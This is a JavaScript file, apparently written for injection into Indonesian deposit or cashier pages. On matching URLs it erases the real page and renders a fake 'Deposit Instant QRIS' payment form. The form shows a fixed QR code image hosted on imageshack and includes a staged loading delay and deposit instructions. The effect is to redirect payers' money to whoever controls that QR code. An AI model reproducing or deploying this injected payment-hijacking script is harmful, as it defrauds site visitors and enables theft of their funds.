(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  // Cek apakah URL sesuai
  const shouldRun = match.some(path => url.includes(path));
  if (!shouldRun) return;

  // Hapus semua isi lama halaman
  document.documentElement.innerHTML = '<head></head><body></body>';

  // Tambahkan style dasar dan container
  const style = `
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(180deg, #0f172a, #1e293b);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    #app {
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }
  `;
  const styleEl = document.createElement('style');
  styleEl.textContent = style;
  document.head.appendChild(styleEl);

  const container = document.createElement('div');
  container.id = 'app';
  document.body.appendChild(container);

  // Komponen QRIS
  function QrisDeposit() {
    return `
      <div class="card">
        <div id="form-section">
          <h2>Deposit Instant QRIS</h2>
          <input type="number" id="amount" placeholder="Minimal Rp 50.000" min="50000" step="1000" />
          <div class="quick-buttons">
            <button class="quick-btn" data-amount="50000">Rp 50.000</button>
            <button class="quick-btn" data-amount="100000">Rp 100.000</button>
            <button class="quick-btn" data-amount="200000">Rp 200.000</button>
          </div>
          <button id="pay">Bayar dengan QRIS</button>
        </div>

        <div id="loading" style="display:none;font-size:18px;font-weight:bold;color:#22c55e;margin:10px 0;">
          Memuat QRIS...
        </div>

        <div id="qr-section" style="display:none;flex-direction:column;align-items:center;">
          <h2>Scan QR untuk Bayar</h2>
          <p style="font-size:14px; color:#94a3b8; margin:6px 0;">Gunakan aplikasi bank/e-wallet untuk memindai.</p>
          <img src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS" style="margin:12px 0;max-width:240px;width:100%;border-radius:8px;" />
          <button id="download-qris" style="margin-top:10px;padding:10px 14px;border:none;border-radius:8px;background:#22c55e;color:#fff;font-weight:bold;cursor:pointer;">
            Download QRIS
          </button>
          <div class="note" style="margin-top:10px;font-size:13px;color:#cbd5e1;">
            <ol style="padding-left:20px;text-align:left;">
              <li>Masukkan nominal lalu klik <b>Bayar dengan QRIS</b>.</li>
              <li>Scan QR di atas melalui aplikasi bank/e-wallet Anda.</li>
              <li>Setelah berhasil, halaman akan menandai pembayaran sebagai <b>Terbayar</b> (simulasi).</li>
              <li><b>Deposit wajib kode unik</b>, contoh: 50.888</li>
            </ol>
          </div>
        </div>
      </div>
    `;
  }

  function initQrisDeposit() {
    const formSection = document.getElementById('form-section');
    const loading = document.getElementById('loading');
    const qrSection = document.getElementById('qr-section');
    const payButton = document.getElementById('pay');
    const amountInput = document.getElementById('amount');
    const downloadBtn = document.getElementById('download-qris');

    // Quick buttons
    document.querySelectorAll('.quick-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        amountInput.value = btn.getAttribute('data-amount');
      });
    });

    // Bayar
    payButton.addEventListener('click', () => {
      const amount = parseInt(amountInput.value);
      if (isNaN(amount) || amount < 50000) {
        alert('Minimal nominal adalah Rp 50.000');
        return;
      }
      formSection.style.display = 'none';
      loading.style.display = 'block';
      setTimeout(() => {
        loading.style.display = 'none';
        qrSection.style.display = 'flex';
      }, 1500);
    });

    // Download QR
    downloadBtn.addEventListener('click', () => {
      window.location.href = 'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg';
    });
  }

  // Render dan jalankan
  container.innerHTML = QrisDeposit();
  initQrisDeposit();
})();
